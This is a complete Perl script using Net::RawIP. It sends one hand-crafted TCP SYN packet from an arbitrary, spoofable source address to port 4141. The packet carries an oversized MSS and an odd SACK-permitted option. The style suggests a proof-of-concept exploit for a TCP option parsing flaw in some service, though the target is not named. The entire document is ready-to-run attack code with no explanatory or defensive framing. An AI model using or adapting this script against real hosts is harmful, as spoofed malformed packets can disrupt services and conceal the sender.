#!/usr/bin/env perl

use warnings;
use strict;
use Net::RawIP;

my $src = $ARGV[0] or &usage();
my $dst = $ARGV[1] or &usage();
my $sp  = int(rand(6000)) + 1024;
my $dp  = 4141;
my $mss = pack('n', 16396);

print "[+] will connect from $src:$sp to $dst:$dp\n";
print "[+] building packet...\n";
my $pkt = Net::RawIP->new({
                            ip => {
                                saddr   => $src,
                                daddr   => $dst
                            },
                            tcp => {
                                source  => $sp,
                                dest    => $dp,
                                syn     => 1,
                                window  => 32792, 
                            }
                        });

$pkt->optset(
                tcp => {
                    type => [ 2, 4 ],	# set MSS and SACK
                    data => [ $mss, pack('C', 0x02) ],
                }
            );
print "[+] sending packet...\n";
$pkt->send( );              # send one packet without delay
print "[+] finished!\n";
exit 0;

sub usage( ) {
	die "usage: $0 <src> <dst>\n";
}


